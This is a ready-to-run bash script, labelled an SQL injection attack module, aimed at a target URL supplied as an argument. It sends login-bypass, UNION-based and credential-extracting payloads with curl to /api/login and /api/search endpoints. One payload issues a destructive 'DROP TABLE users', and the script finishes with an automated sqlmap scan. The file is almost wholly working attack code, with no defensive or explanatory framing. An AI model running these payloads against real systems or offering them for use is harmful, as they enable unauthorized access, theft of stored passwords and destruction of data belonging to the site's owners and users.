#!/bin/bash
TARGET="$1"

echo "========================================="
echo "[*] SQL INJECTION ATTACK MODULE"
echo "[*] Target: $TARGET"
echo "[*] Tool: curl + sqlmap"
echo "========================================="

echo ""
echo "[*] Phase 1: Manual SQL Injection payloads via curl"
echo "---"

echo "[>] Payload: admin' --  (comment-based bypass)"
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' --","password":"anything"}'
echo ""

echo "[>] Payload: ' OR 1=1 --  (boolean-based bypass)"
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR 1=1 --","password":"x"}'
echo ""

echo "[>] Payload: ' UNION SELECT 1,2,3,4 --  (union injection)"
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT 1,2,3,4 --","password":"x"}'
echo ""

echo "[>] Payload: ' OR '1'='1  (classic tautology)"
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1","password":"'\'' OR '\''1'\''='\''1"}'
echo ""

echo "[>] Payload: admin'; DROP TABLE users; --  (destructive)"
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''; DROP TABLE users; --","password":"x"}'
echo ""

echo ""
echo "[*] Phase 2: SQL Injection against search endpoint"
echo "---"

echo "[>] Payload: ' OR 1=1 --  (search bypass)"
curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query":"'\'' OR 1=1 --"}'
echo ""

echo "[>] Payload: ' UNION SELECT username,password FROM users --"
curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query":"'\'' UNION SELECT username,password FROM users --"}'
echo ""

echo ""
echo "[*] Phase 3: sqlmap automated scan"
echo "---"

if command -v sqlmap &> /dev/null; then
  sqlmap -u "$TARGET/api/login" \
    --method POST \
    --data='{"username":"test","password":"test"}' \
    --headers="Content-Type: application/json" \
    --batch --level=1 --risk=1 \
    --timeout=30 \
    --retries=1 \
    --output-dir=/tmp/sqlmap_output 2>&1 | tail -30
else
  echo "[!] sqlmap not found, skipping automated scan"
fi

echo ""
echo "========================================="
echo "[+] SQL Injection attack module complete"
echo "========================================="
